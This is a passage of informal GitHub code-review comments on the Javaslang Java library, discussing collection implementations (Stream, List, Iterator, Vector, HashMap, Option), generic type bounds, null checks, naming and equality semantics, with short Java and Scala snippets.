primeFactorsAndResultingValTail(tuple));\n. Stream.cons(T head, Supplier<Stream<T>> tail) would be also a candidate instead of gen but by using gen we keep the amount of factory method names small. Should be ok!\n. Just one minor thing - this can be simplified to\njava\nreturn new Stream.Cons<>(head, tailSupplier);\n. Lovely! I did not know about StringBuilder.reverse() yet.\nCould you replace (i) and (j) with i and j?\n. largets vs. largest\n. I've thought about the flatMap. It is really nice - I can't think of another solution.\n. Please replace the method with:\njava\n    default <R> Try<R> andThen(CheckedFunction1<T, R> f) {\n        return flatMap(value -> Try.of(() -> f.apply(value)));\n    }\nScala folks would say flatMap that shit :-)\n. ~~yep, will fix it. thx!~~\nnope, the double quotes are text within a rich string and no string literals. The whole string starts with xs\"\"\" in line 1139. It is all ok.\n. Yes, you're right :-) It is better than the solution before, which used 2 x filter(), which uses foldLeft(), which also calls reverse(), i.e. 2 x 3 = 6 passes in sum. There is no improvement when using ArrayList for building lists because List.ofAll(Iterable) has to be called to convert the ArrayList to a javaslang.collection.List, which internally also needs to call reverse(). I think there is no better solution for a single-linked list.\n. Mmhhh, nope, that's not right what I wrote. An ArrayList could be iterated backward to create a javaslang List, i.e. there is no need to call reverse(). That would be 1 pass for iterating List elements plus 2 passes to convert left and right ArrayList, in sum 3 passes for partition(). However, I need to provide a better implementation for List.ofAll(Iterable).\nThanks Sebastian, I will do that!\n. Note: List.ofAll(Interable) could be improved in a future version of Javaslang in the same way as for ArrayList by reverse-iterating all IndexedSeq instances. See https://github.com/javaslang/javaslang/issues/220#issuecomment-111876895 for IndexedSeq type hierarchy.\n. @szarnekow of course the ArrayLists have also to be passed. That means we need 3 passes instead of 1. I updated the comments above accordingly.\nI see a slight improvement using ArrayList compared to the first solution using javaslang's linked List and reverse() because no intermediate Cons objects are created while iterating the original List.\n. In fact we now have 2 passes overall because left.size() + right.size() = n.\n. @szarnekow That helps! Didn't know that.\nDo you want to create a pull request or should I...?\n. Hi Sebastian,\njust a question - is there an advantage providing a <?> when using instanceof? I haven't seen it before. Also javac does not complain when omitting it (using -Xlint:all -Werror).\n. Reflexes are a good thing - I also do that in different contexts. In general Java's type system is funny (sort of). IMO for example the assignment List<T> list2 = list should be valid, where list is of type List<? extends T>, but it does not compile. I do that in some locations of Javaslang (using type casts) and suppress the 'unchecked' warnings...\n. Will be mapTry(CheckedFunction1<? super T, ? extends R> f). Please note the generic type bounds.\n. Will be andThen(CheckedConsumer<? super T> f). Please note the generic type bounds.\n. This implementation is a bit shorter - we do not need to wrap it in a flatMap because we know that we are already in the Success case:\njava\npublic Try<T> andThen(CheckedConsumer<? super T> consumer) {\n    return Try.run(() -> consumer.accept(value)).flatMap(ignored -> this);\n}\n. Cool, you're fast. I see the goal of 99 coming nearer :)\nInstead of Stream.range(2, max + 1) please use Stream.rangeInclusive(2, max). That's the canonical use-case.\nThx\n. I ask myself, if the following is equivalent (and maybe faster):\njava\nreturn Stream.rangeInclusive(2, max)\n        .map(BigInteger::valueOf)\n        .flatMap(a -> Stream.rangeInclusive(2, max).map(b -> a.pow(b))\n        .distinct()\n        .length();\n. Whoops :-))\n. @mperry Thank you for the hint! I will revert the change.\n. @mperry What do you think of having a Monad / FilterMonadic interface with methods (in conjunction with the Kindfor semi-higher order kinds):\n-flatMapM-flattenM`\nHave these methods a different meaning, too, in other languages?\nI can't use the original names flatMap and flatten because they have a different, relaxed signature (with Iterable instead of Monad/FilterMonadic for  Traversables).\nThanks in advance!\n. Maybe the for condition !stream.isEmpty() can be extended to index <= end && !stream.isEmpty()? ...\n. ... then we can remove the check here and the loop ends, if index > end.\nWould this be the same semantic?\n. Did we check the case that front.length() > from. Just asking for the case ... :) I didn't dig deep into it...\n. See my comment at Stream.java below (for-loop)\n. ok, thx!\n. Don't shame on you - we team up to get the best result. There is nearly always room for improvement.\n. It makes sense to widen the type bounds here. Instead of Iterable<T> I would use Iterable<? extends T>.\n. Also here Iterable<? extends T>\n. but here not - within Util we know that we have exactly type T (also the slice has the right type returned by unit()).\n. For user-friendly error messages I check for null when args are other than simple values.\nHere I would insert Objects.requireNonNull(that, \"that is null\");\nand also declare a javadoc param @throws NullPointerException if that is null.\n. Also here I would insert Objects.requireNonNull(that, \"that is null\");\nand also declare a javadoc param @throws NullPointerException if that is null.\n. Also here I would insert Objects.requireNonNull(that, \"that is null\");\nand also declare a javadoc param @throws NullPointerException if that is null.\n. Also here I would insert Objects.requireNonNull(that, \"that is null\");\nand also declare a javadoc param @throws NullPointerException if that is null.\n. Also here I would insert Objects.requireNonNull(that, \"that is null\");\nand also declare a javadoc param @throws NullPointerException if that is null.\n. Oh - just recognized that this line was removed :)\n. The array is intentionally not cloned/duplicated, i.e. it may be modified. However, each new call of getType() will create a new parameterTypes array.\nMutation is generally discouraged (by me). Don't do that - or at most carefully.\n. @szarnekow Good Morning! Did you mean\n\nIterable<?> rather than Iterable<? extends T>\n\nor\n\nIterable<? super T> rather than Iterable<? extends T>\n\nWe need the type-safety in general I think. It could be possible to first 'downgrade' the traversable, e.g.\njava\ntraversable                     // is a Traversable<String>\n        .as(CharSequence.class) // returns a Traversable<CharSequence>\n        .indexOfSlice(that, 0)\nUnfortunately it is not possible in Java to define a generic lower bound <U super T> (which I do not understand but which may have to do with the compiler algorithm to that finds correct bounds):\njava\n<U super T> Traversable<U> as(Class<U> type) {\n    return (Traversable<U>) this;\n}\nThat means that Iterable<?> would be the only solution to allow lower bounds (Iterable<? super T> that) and upper bounds (Iterable<? extends T> that).\nMy impression also is, that Iterable<?> will be error-prone.\n. @szarnekow yes, haven't thought of these cases... Good to have your X-Files (Xtext & Xtend) know-how here! :-)\n. Just some thoughts for the future:\nMaybe there will be a future refactoring and we will make collection classes interfaces. This enables us to use lazy values:\njava\n// real lazy value: evaluated and memoized on demand!\nHashMap<?, ?> map = Lazy.asVal(() -> HashMap.empty(), HashMap.class);\nBut for now lets use classes!\n. Maybe it makes sense to make the empty HashMap a singleton, too. It will be frequently used.\n. Maybe we should name it HashArrayMappedTrie (as specialization of HashTree). (A HashTree interface can then later be created, if needed.) This is your original name. I will most probably also do this with RedBlackTree, which is a BinarySearchTree.\n. Please let's have static factory methods in terminal collection interfaces/classes (like List, Stream, HashMap, ...) which are like classes. In the image these are the leafs.\n\nI'm not sure, if it helps to have in other interfaces static factory methods. My experience is, that it feels a little bit magic, when users are not familiar with the collection lib and don't know which instance they get. It is better to be explicit:\njava\nMap<?, ?> map = HashMap.empty().put(\"Hi\", \"Ruslan\");\n. Here I thought of toHashMap and later add toTreeMap. But I start to see, what you may have in mind. Alternatively we could provide a toMap and toSortedMap, which is great, too. On the other hand is always good to be as specific as possible. What do you think?\n. Thanks for being uncomplaining regarding all my commits. I bet you had some merge conflicts the last days... It is under heavy development :-)\n. Then let's do it with toMap and toSortedMap!\n. Hi, I think the build fails because the serialVersionUID = 1L is missing...\n. With list we trade space against performance here. This is nice regarding performance. I wonder how Scala does this for Map/Set... I'm just curious.\n. Ah - there is a unit test that checks, if all return types are as special as they can be.\nExample:\nOption.map returns Option but we know that None.map returns a None.\nIf we do not overwrite Option.map within None that way, it is put on the WHITELIST in the unit test.\nYou can copy the String 1:1 from the console and add a WHITELIST entry.\n. But this prototype is fine. It is exactly what we wanted!\n. This is a great idea to extract it! We have so many classes beside collections, which implement TraversableOnce already!\n. Because Interable is lazy, i.e. evaluates values only, when needed, we will take an approch similar to Stream.peek(Consumer):\n``` java\n@Override\ndefault Iterator peek(Consumer<? super T> action) {\n    Objects.requireNonNull(action, \"action is null\");\n    if (!hasNext()) {\n        return Iterator.empty();\n    } else {\n        final Iterator that = this;\n        return new Iterator() {\n            @Override\n             public boolean hasNext() {\n                 return that.hasNext();\n             }\n        @Override\n         public T next() {\n             if (!hasNext()) {\n                 throw new NoSuchElementException();\n             }\n             final T next = that.next();\n             consumer.accept(next);\n             return next;\n         }\n\n}\n```\nPlease remove the abstract class Impl, we do not need it.\nI hope you dont't mind to revert a part of your work. I really appreciate your help!\nGreets,\nDaniel\nPS: I only have an iPad here. The code above is not tetsted, it may not work.\n. I think not, because Iterators are mutable/not reusable. The new Iterator would wrap the other and be the identity operation. It is semantically the same as this.\n. The same with ofAll(Iterator) and ofAll(Iterable) they are effectively the identity and will be removed. I created an issue yesterday. Then the method iterator() will be removed completely!\nYou can do this (remove ofAll(Iterable), ofAll(Iterator) and iterator()).\nWhen we need elsewhere an Iterable and we have already an Iterator we just do. () -> myIterator\n. Oh, I've overseen it. Then iterator() stays with us and the ofAll() methods pass away. (Note: we still need ofAll(T...))\n. I meant, if we have an Iterable, we just call myIterable.iterator() to obtain an iterator...\n. Oh - CAUTION - we still need ofAll(java.util.Iterator) AND ALSO ofAll(Iterable) because they lift java.util.Iterator to javaslang.collection.Iterator. (Wish I had my Notebook here, mobile phone is not good for programming...)\n. :) thx \u2615\ufe0f\u2615\ufe0f\n. great, that's the way to do it!\n. For Stream the Tuple.of(take(n), drop(n)) solution is the best, because take() is lazy and no intermediate Tuple objects are required.\n. Let's name it remove(int) to align it with set(int, T). Will this cause ambiguities when we have a Seq<Integer>? Then we should name it removeAt() to align it with splitAt().\n. We should throw on illegal indices, like insert and set do:\njava\n@throws IndexOutOfBoundsException if this is empty, index &lt; 0 or index &gt;= length()\n. I would name it init\n. This could also work here:\njava\nreturn (iterators.length == 0) ? Iterator.empty() : new ConcatIterator<>(List.of(iterators));\n. Does the body compile with arg type Iterator<? extends T>?\n. @ruslansennov yes, I would also suggest the double-extends variant. See https://github.com/javaslang/javaslang/issues/352#issuecomment-125876580\n. The other stuff looks great!\n. Yes, let's delete this method and substitue the call with Sebastian's suggestion\n. I would name this splitByPredicateReversed to give a hint that the first component is split\n. (minor) I would test the positive condition isEmpty() and swap the cases. It is less information for the human brain to process and ! can be overseen\n. If possible, generally please make all values final. It is one of the main rules to achieve functional programs.\n. dito\n. Towards #460 it would make sense to do the following:\njava\nif (t._2.isEmpty() || t._2.tail().isEmpty()) {\n    return Tuple.of(this, empty());\n} else {\n    return Tuple.of(...);\n}\n. Towards #460:\njava\nif (t._2.isEmpty()) {\n    return Tuple.of(this, empty());\n} else {\n    return Tuple.of(...);\n}\n. please final\n. Oohh, and please add {@link #...} items to the javadoc of the class. (I think we forgot this for other Traversable or Seq methods we added the last days.)\nNote: Frequently running mvn javadoc:javadoc ensures that doclint is happy. (If not, the javadoc of the snapshot is not properly updated on javaslang.com)\n. what about the tree? does it return the same instance when removing an element which is not contained? if so, we may compare tree == removed, where removed = tree.remove(element)\n. also here. if true.remove(element) returns the same instance, we may test with == instead of size and length\n. Very cool. We are now collecting the fruits after your length implementation!\n. i would name it isFiltered to suggest that nothing failed\n. Mmhh, we need to iterate all elements. Me may save the last reverse() even shorter without variables:\njava\nfinal List<T> filtered = foldLeft(List.<T> empty(), (xs, x) -> predicate.test(x) ? xs.prepend(x) : xs);\nreturn (this.length() == filtered.length()) ? this : filtered.reverse();\n. Update: This is wrong!\njava\nif (n >= length) {\n    return empty();\n}\n. Oh no! It's a Stream :-)\n. I would do a reverse().removeFirst(predicate) instead of findFirst in order to not process elements 2 times, e.g.\njava\nfinal Stream<T> removed = reverse().removeFirst(predicate);\nreturn removed.length() == length() ? this : removed.reverse();\n. Cool!\n. we should also check for n <= 0 here\n. Just saw that length is Lazy. When we do it elsewhere, e.g. in Stream.takeRight we should also check n >= length() here.\n. And boom, Ruslan comes with Vector around the corner :-)) I love this HAMT!!\nI've learned that Nil is somewhat 'reserved' for the empty (lazy) linked list. Lets name it Empty.\n. This is an implementation detail. A vector may be backed by another data structure. Let's make it not public API and remove this method.\n. if we really need the trie instance in another place, let's make it package private but for now leave it private if possible.\n. Or better: remove it if possible. An empty Vector should be identified by isEmpty().\n. Let's make it public.\n. I see. I would prefer to implement all methods for the empty case in the Empty instance. But that's a huge amount of extra work. For now let's keep it this way. It's ok.\n. That's the very thing! We need the abstract interface though. Bonus: We can adjust the return types to Impl and Empty where possible.\n. In exchange I will not commit & push until you are finished :-) So if there's s.th. to merge I'll do it!\n. Beside the trie method all other things look awesome to me!\n. Please remove all public API related to Trie. We do not really need it. The new Value I committed yesterday has all conversion methods between 'regular' collections one could need. I see HAMT, RedBlackTree, ... as backing collections, not as core collections. They do not extends Traversable et al. If in doubt, we have implemented the Iterable interface, which is sufficient to create any Traversable collection via ofAll.\n. Hold fire! HashMap, HashSet and Queue are currently classes. I thought about making them interfaces. But we may also stay with them as classes and make Vector a class instead. Then you could keep your implementation and remove the inner classes.\n. It needs to be final.\n. And the trie stuff can be private...\n. Hi Ruslan, what was your intention here? Changing it to super-interface IndexedSeq should work. This is a general philosophy: when are objects equal.\nTo keep it consistent with the other classes I would keep Vector here.\n. Ok, I see. Have to think about it. Will come back later...\n. I would make this of(CharSequence)\n. also check for null (Objects.requireNonNull)\n. dito null-check\n. I wanted to think about the usage of Vector. This is what I've come to:\nScala uses for WrappedString.combinations(int) as return type Iterator<WrappedString>. I also prefer not to use Vector directly. Instead I would use Seq or Iterator. Seq is not a good alternative because of the wildcards in return types, e.g. Tuple2<? extends Seq, ...>. This leads to Iterator in the case of this method (which could be obtained by calling result.iterator()).\nIn general there is another thing which comes to my mind. Instead of wrapping a sequence of chars, i.e. java.lang.String, we could wrap a sequence of arbitrary object, for example stored in Vector<?> back. This would flatMap allow to return a WrappedString. When a concrete String representation is needed, back.mkString() could be called. Example: replaceAll(regEx, Str) = back.mkString().replaceAll(regEx, Str).\nThis is just an initial thought. Before going further I've to think more about it (later today).\n@ruslansennov @patrox What are your thoughts?\n. Yes, the new (yet unknown) solution will require that\n. yes, we may do that but before starting implementation please wait until later today...\n. I've made some manual tests on the Scala REPL. We should keep it as is, with back of type String. Also the return type Vector is good is almost all places. I will provide comments in a minute where we need changes...\n. With flatMap we have a TODO in general but not here, with this pull-request.\nExample:\n``` scala\nscala> \"123\".flatMap(Some(_))\nres0: String = 123\nscala> \"123\".flatMap(c => Some(c + 0))\nres1: scala.collection.immutable.IndexedSeq[Int] = Vector(49, 50, 51)\nscala> val words = Set(\"Patryk\", \"Ruslan\", \"Daniel\")\nwords: scala.collection.immutable.Set[String] = Set(Patryk, Ruslan, Daniel)\nscala> words flatMap (word => word.toSet)\nres2: scala.collection.immutable.Set[Char] = Set(e, s, n, y, t, u, a, i, l, P, r, R, k, D)\nscala> words flatten (word => word.toSet)\nres3: scala.collection.immutable.Set[Char] = Set(e, s, n, y, t, u, a, i, l, P, r, R, k, D)\n```\nOur flatMap works totally different. We need to check what is possible with Java, what makes sense and what is the expected behavior of flatMap. Maybe we need a Monad.unit(val) and Monoid.combine(m1, m2)...\n. This looks really great! Compared to Scala:\n``` scala\nscala> \"abc\".map(_ + \"z\")\nres0: scala.collection.immutable.IndexedSeq[String] = Vector(az, bz, cz)\nscala> \"abc\".map(_ + 0)\nres1: scala.collection.immutable.IndexedSeq[Int] = Vector(97, 98, 99)\n```\n. yes :-))\n. this is nice!\n. I tested a little bit and recognized that we need another equals implementation.\nThe underlying HashArrayMappedTrie may have stored the elements in an arbitrary order, so that the iterators do not return the elements in a specific order.\nThis lead to this implementation:\njava\n@SuppressWarnings(\"unchecked\")\n@Override\npublic boolean equals(Object o) {\n    if (o == this) {\n        return true;\n    } else if (o instanceof HashSet) {\n        final HashSet<?> that = (HashSet<?>) o;\n        return this.length() == that.length() && ((HashSet<Object>) this).containsAll(that);\n    } else {\n        return false;\n    }\n}\nWe do not cast to <T> in order to prevent ClassCastExceptions.\nThanks for for your finding!!\n. :+1: \n. let's do Objects.requireNonNull(predicate, \"predicate is null\"). I've also forgotten in in various places and will add them later...\n. dito\n. dito\n. Yay! Getting rid of list :-)\n. Let's do curly braces if { ... } else { ... }. It's less error prone. Thx! :)\n. I will merge it - it's working perfectly - braces can be added later...\n. is it a typo? startsWidth instead of startsWith\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. :-)\n. or is it i < length - back.length()?\n\"12345\".padTo(10, 'a') should be 12345aaaaa\n. here also - it should be take(length - this.length()), am I right?\n. dito\n. dito\n. just a little thing: let's introduce a final int bound = length - back.length(); that saves us calculating the bound each time checking the loop condition.\n. Now that we have Iterator (mostly) up and running, we should use Iterator instead of Stream. It is more lightweight in the sense of number of objects instantiated. I will create a separate issue for that to add Iterator.gen(...) and Iterator.from(...).\n. This line brought me to the question: why we aren't using T[] instead of Object[]?\n. Also in Array. Wouldn't it be better to make back of type T[] and additionally provide factory methods to create typed, empty arrays of a specific size? E.g. static <T> T[] create(int size) or maybe static <T> T[] create(int size, Class<T> type). Then the package internal wrap method can be possibly removed.\n``` java\n// T[] instead?\nprivate final Object[] back;\nprivate Array(Object[] back) {\n    this.back = back;\n}\n``\n. Yes, we shouldn't change the signatures.\n. Let's changeIterator.equals(Iterator<? extends T> that)toIterator.equals(Iterator<?> that)` and then\nfinal HashMap<?, ?> that = (HashMap<?, ?>) o;\nreturn this.iterator().equals(that.iterator())`?\nthis reduces duplicate code and may be also used in other collections.\n. ok. what if we relax Iterator.equals(...) as I described below?\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. dito\n. great!!\n. I would call queue.enqueue(that.next()) (which is the same)\n. What is the use case for overriding Iterator.equals? If we compare it, it is gone.\n. Throughout Javaslang equals is implemented as follows:\n1. o instance of this.getClass(), i.e. o != null && this.getClass() is assignable from o.getClass()\n2. fields are equal\nTo compare values only, one could do s.th. similar to Stream.ofAll(iter1).equals(Stream.ofAll(iter2)).\n. unnecessary check. o instanceof ... returns false if o is null. \n. whoops :)\n. yes, you are right, interfaces in Java 8 cannot have default methods which override methods of Object. I intentionally left it unoverridden. However, let's do it your way. But we need to check o instanceof Iterator IMO. If someone needs to compare an iterable, one could call iterator.equals(iterable.iterator()).\n. on the other hand\njava\nIterator<?> that = List.of(0, 1, 2, 3).iterator();\nthat = that.next();\nList.of(1, 2, 3).iterator().equals(that); // = true\nwhich is odd.\nIt is more comprehensible if two Iterators are equal, if their memory references are equal. Because they always will have the same state.\n. haha, ok :)\n. Iterator equality is a very interesting question. I asked Scala. It says:\n``` scala\nscala> List(1, 2, 3) == List(1, 2, 3)\nres0: Boolean = true\nscala> List(1, 2, 3) == Stream(1, 2, 3)\nres1: Boolean = true\nscala> Stream(1, 2, 3) == List(1, 2, 3)\nres2: Boolean = true\nscala> Iterator(1, 2, 3) == List(1, 2, 3)\nres3: Boolean = false\nscala> Iterator(1, 2, 3) == Iterator(1, 2, 3)\nres4: Boolean = false\nscala> Iterator(1, 2, 3)\nres5: Iterator[Int] = non-empty iterator\nscala> res5 == res5\nres6: Boolean = true\n``\n. Mmhh, Scala's equals==` is odd:\n`` scala\nscala> Some(1) == List(1)\n<console>:8: warning: comparing values of types Some[Int] and List[Int] using==` will always yield false\n              Some(1) == List(1)\n                      ^\nres10: Boolean = false\nscala> Map(1 -> 'a', 2 -> 'b') == List((1 -> 'a'), (2 -> 'b'))\nres11: Boolean = false\nscala> (1 -> 'a')\nres12: (Int, Char) = (1,a)\nscala> Map(1 -> 'a')\nres13: scala.collection.immutable.Map[Int,Char] = Map(1 -> a)\nscala> Map(1 -> 'a').toList\nres14: List[(Int, Char)] = List((1,a))\nscala> Map(1 -> 'a').toList == List((1 -> 'a'))\nres15: Boolean = true\nscala> Map(1 -> 'a') == List((1 -> 'a'))\nres16: Boolean = false\n```\nJavaslang's Option/Some/None is Iterable. Miming Scala's behavior we could compare Iterables in general (e.g. a default ~~equals method~~ in Iterable interface) (update: equals cannot be a default method). Then Some(1).equals(List(1)) and None.equals(List.empty()) etc.\nOr we may provide a method eq for that beside equals.\n. As already mentioned I would change the bounds:\njava\ndefault <U> boolean corresponds(java.lang.Iterable<? extends U> that, Predicate<Tuple2<? super T, ? super U>> predicate)\nAlso I would move corresponds to javaslang.Iterable.\nUse case: The following RedBlackTrees (and therefore SortedSets) are equal/corresponding:\njava\n      -1       -1\n      / \\      / \\\n    -2   1   -2   0\n        /          \\\n       0            1\nbecause both Iterators return elements in the following order (tree in-order): -2, -1, 0, 1.\n. Hey Ruslan,\nI urgently need corresponds to fix my local branch. Therefore I will merge the PR now!! I hope this is ok for you.\n(I removed Iterator.equals as I explained in #547 and not shouldConvertToMap tests fail. The corresponds will heal that.)\n. changing the signature as suggested above (? extends, ? super) then the following test does not compile any more:\njava\n// error: operator '-' not applicable to Object\nassertThat(of(1, 2, 3).corresponds(of(3, 4, 5), t -> t._1 == t._2 - 2)).isTrue();\nTherefore I will leave the signature as you committed it.\n. We can use a BiPredicate instead of Predicate<Tuple2>. That will save intermediate object creations. I will adapt that.\n. yep, makes sense\n. first impression here is, that we can do:\njava\nreturn new Iterator<T>() {\n    private int index = indexShift;\n    private final size = trie.size() + indexShift;\n    @Override public boolean hasNext() {\n        return index < size;\n    }\n    @Override public T next() {\n        return trie.get(index++).get();\n    }\n}\n. Can this be < 0? is the indexShift always >= 0? I have to read further through the code...\n. use elements.iterator() (of type java.util.Iterator) instead of List.ofAll(). this will save cycles and memory\n. ok\n. wow, I start to understand. your idea is really cunning\n. start with i = newIndexShift ...\n. ... and put(i, list.head()) instead ...\n. mmhh, we could convert the elements to an IndexedSeq. If it is already an indexed seq (checked via instanceof) it is just a cast in O(1), otherwise we could put the elements in an Object[] and wrap it in an Array.\nLater in the for-loop we do a indexedSeq.get(i) instead of list.head().\nDon't know if that is really better...\n. This logic can be encapsulated in a static factory method of IndexedSeq:\njava\ninterface IndexedSeq<T> extends Seq<T> {\n    static<T> IndexedSeq<T> ofAll(java.lang.Iterable<? extends T> elements) {\n        Objects.requireNonNull(elements, \"elements is null\");\n        if (elements instanceof IndexedSeq) {\n            return (IndexSeq<T>) elements;\n        } else {\n            int i = 0;\n            final Object[] array = new Object[???]; // oohh - we need to know the size...\n            for (T t : elelemts) {\n                array[i++] = t;\n            }\n            return new Array<>(array); // constructor needs to be package private\n        }\n    }\n}\n. or just\njava\ninterface IndexedSeq<T> extends Seq<T> {\n    static<T> IndexedSeq<T> ofAll(java.lang.Iterable<? extends T> elements) {\n        Objects.requireNonNull(elements, \"elements is null\");\n        if (elements instanceof IndexedSeq) {\n            return (IndexSeq<T>) elements;\n        } else {\n            return Vector.ofAll(elements); // Vector is our default IndexSeq!!!\n        }\n    }\n}\n. then we stay as is with List\n. The first thing I see is that you probably use IntelliJ with the default settings because the format changed slightly. Don't mind - it is ok! I provided the Javaslang settings in ./ide/idea-settings.jar. If you use them it is good, if not it does not really matter...\n. (The benefit of using the same format is, that only real changes are shown in the diff)\n. great!\n. There is one caveat: javaslang.collection.Iterator is Iterable. With Iterator it does not work. Let's revert this line.\nDoes this happen elsewhere, too? I will double-check the code...\n. Dito\n. ``` java\n/\njava.lang.Iterable\n       ^\n       |\njavaslang.Iterable\n       ^\n       |\njavaslang.Value\n       ^\n       |\njavaslang.collection.TraversableOnce\n       ^\n       |\njavaslang.collection.Iterator\n/\nTreeSet.ofAll(Iterator.of(1, 2, 3)); // BOOM :)\n``\n. You are right. hasNext() has also to be called by next() as of the API contract in Java docs. That means that it can be called twice or more without changing the public visible state. Thx for clarification.\n. Yes, figured it out by accident [while implementing sorted collections](https://gist.github.com/danieldietrich/d15081d84fce08e30153). Really sweet!\n. good!!\n. really? don't we need it?\n. ok!\n. Then let's also save the null-check. And to be conform with the previous impl and maxBy(Comparator), we need to use>instead of>=` (see internals of reduce and foldLeft... the zero is the previous value - but here we use the current value)\njava\nfinal Iterator<T> iter = iterator();\nT tm = iter.next();\nU um = f.apply(tm);\nwhile (iter.hasNext()) {\n    final T t = iter.next();\n    final U u = f.apply(t);\n    if (u.compareTo(um) > 0) {\n        um = u;\n        tm = t;\n    }\n}\nreturn new Some<>(tm);\n. Same here...\njava\nfinal Iterator<T> iter = iterator();\nT tm = iter.next();\nU um = f.apply(tm);\nwhile (iter.hasNext()) {\n    final T t = iter.next();\n    final U u = f.apply(t);\n    if (u.compareTo(um) < 0) {\n        um = u;\n        tm = t;\n    }\n}\nreturn new Some<>(tm);\n. See this comment regarding readability.\n. see Tuple1 comment\n. Hey @mvh77, that's a really nice addition!\nI think we don't need the isEmpty() checks here. For example when xs.isEmpty() then xs is already Vector.empty() and we can just return xs. What do you think, have I overseen s.th.?\n. It is good to remove unnecessary stuff. After the pull I will test it again in Eclipse, IntelliJ etc. I had cases where one IDE says it is ok, the other complains... We will see :-)\n. Please check here also, if the extra isEmpty() handling is really needed. My feeling says it is not.\n. Oh you are right :)\nYou carried out the changes carefully, very nice! Please do the following:\n- remove the extra isEmpty() checks in CharSeq and Vector\n- please also change CharSeq.unzip and Vector.unzip and remove == 0 checks\nThen I will pull it and immediately release 2.0.0-RC1\nGreat work!\n. Oh, thanks for catching - I thought I've catched all after changing mkString(infix, prefix, suffix) to mkString(prefix, infix, suffix).\n. Let's use Supplier<? extends T>. There are situations where it is necessary.\nAlso we do null checks in order to provide user-friendly messages, e.g. Objects.requireNonNull(supplier, \"supplier is null\");\n. I would do a return condition ? of(supplier.get()) : none(); here but that is a matter of taste. Using your guard method is ok!\n. We prefer readable names for method arguments, e.g. predicate instead of p. I know that it blows up the code slightly but the code reads better in most cases. However, I think for functions and predicates it is ok to use f and p. Using s for supplier might be confusing because s is often used for String. Just saying in order to talk about some conventions. There is not much documentation on it currently.\nWe also check objects for null in order to give the user good error messages. E.g. here we would do a\njava\nObjects.requireNonNull(predicate, \"predicate is null\");\nHere is predicate better then p.\n. This is a good example where no curly braces are needed! But in most other cases we write them...\n. ...e.g. here...\n. ...and here...\n. ...also here...\n. dito\n. dito\n. null-check\n. null-check\n. null-check\n. null-check\n. null-check\n. null-check\n. null-check\n. null-check\n. null-check\n. null-check\n. right :)\n. that's the so called double null-check pattern \ud83d\ude01\ud83d\ude02\n. Great, thx! I've two remarks:\n- Let's take Optional<? extends T>, it is useful in some cases\n- I would not call it wrap, because the Optional instance is not wrapped but converted somehow. toOption is already defined in Value and asOption would be confusing because we also have toOption. It is syntactic sugar/a shortcut for Option.of(optional.orElse(null)). Using of(Optional) would raise ambiguities regarding of(T). Let's call it ofOptional(Optional).\n. It could also be return of(optional.orElse(null)); - your choice :-)\n. Hi, please move this method behind the next method (of(Comparator, Tuple2)) and add an additional method\njava\npublic static <K, V> TreeMap<K, V> of(Comparator<? super K> keyComparator, K key, V value) {\n    ...\n}\n. whooops :-)\n. please correct it...\n. hehe\n. I think this method can be omitted, it should be the same as calling t.reverse() directly because of the existing List.reverse() impl.\n. We should move this functionality to javaslang.collection.Iterator and remove the ScanImpl class. Whe then remove the thiz arg and just use this instead. The other classes call iterator().scan... instead of ScanImpl.scan....\n. yes, you're right\n. what happens if we permit zero to be null- should work!?\n. alright!\n. > possible, but we still need to have that reverse (actually should be reversed if we copy Scala) method. in an interface it will be visible.\nIn this case I created auxiliary classes, in this case\n```\npublic interface Traversable { ... }\ninterface TraversableModule {\nclass ScanUtil {\n    static ... reverse(...) { ... }\n}\n\n}\n``\n. The compiler flag-Xlint:all -Werrorprevents compiling if auxiliary classes are accessed from outside of the class file.\n. an alternative would be to createSeqfactory methods which default toList` for example. Then we would have\njava\nSeq.ofAll(traversable).reverse()\ninstead of\njava\nhelper.reverse(traversable);\n. Awesome! Overall it now looks really great.\nOne more thing: let's relax ofAll(Traversable) and do the following:\njava\nstatic <T> Seq<T> ofAll(java.lang.Iterable<? extends T> elements) { ... }\nThx!\n. This needs to be an abstract method, also in SortedMap.\nWe need to implement it with appropriate return type in HashMap, LinkedHashMap and TreeMap.\n. We can't use the concrete HashMap.of here because it is an abstract Map test, the base for all Map implementations. Please use the methods empty, of and ofAll which are implemented by all AbstractMapTest implementations.\n. Please try not to reformat the code. Do you use Eclipse? For IntelliJ I exported the settings, located in .ide/.\n. 'stupid mistakes' do not exist :-) It is the 'normal' dev workflow - hacking - reviewing - fixing - ...\nIt is fun!\n. Yes, do you have a hint how to do it?\nI've mixed feelings with these tools because sometimes they seem to know more than the developer or produce false errors. However, these tools are great finding critical bugs. Using them should create value for us.\n. Great! Please update the travis config - I'm really looking forward to the checks :-)\nI'm sure that there will be significant amount of TODO to fix the findings :-))\n. What's the benefit of making it static? Just asking. static is fine! It makes clear that we do not depend on any (mutable) state :-) \nWe save the implicit this. Are there more benefits? I've read somewhere that \"Memory is allocated for a method when the method is invoked. (And it doesn't matter whether the method is a static or instance method.\". The bytecode for non-static methods is allocated only once and re-used by every instance.\n. Aaah, I understand. Nice idea!! To save all the instances. Great!!\n. If we allow null keys, this has to be Objects.equals(key, this.key), right?\n. Yes, tests will come. I'm on s.th. and am busy for a few days until I can fully focus on the tests...\nthe equals calls need to be changed all over the HAMT. we also compare tuple._1.equals(key) in LeafList etc.\n. Shift happens :-)\n. Great, I think that solves a problem we recently had (without any solution).\nI ask myself, if it really should be\njava\nmkString(\"\", lineSeparator(), lineSeparator())\nbecause we changed the argument order of mkString from infix, prefix, suffix to prefix, infix, suffix.\nTherefore the following may be right:\njava\nmkString(lineSeparator(), \"\", lineSeparator())\nBut if the tests pass, it probably is right as-is.\n. We need to name it ofAll\n. It is not a good idea to have this put method. In fact it is a merge of maps which needs to handle collisions. We already have it.\nAlso I do not want to add specific java.util.* methods to the Javaslang library. For conversion we have the ofAll factory methods and the toJavaXxx() methods.\nPlease move the body of the put methods to the ofAll(java.util.Map) methods. We then can do the following:\njava\njava.util.Map<...> map1 = ...;\njavaslang.collection.Map<...> map2 = ...;\nmap2.merge(HashMap.ofAll(map1));\n. also ofAll\n. also move to ofAll and use merge instead like described above\n. can be removed\n. ofAll\n. see above\n. shouldMergeJavaUtilMap\n. Great! Love this method.\nPlease rename it to traverse (same functionality as Tree.traverse()) and move it behind int size();.\nThx!\n. Store somewhere\njava\nfinal int length = t.length() - slice.length();\nand then use\njava\nwhile (p < length) {\n    ...\n}\n. I think we don't need this method. Should be the same as t.startsWith(prefix, 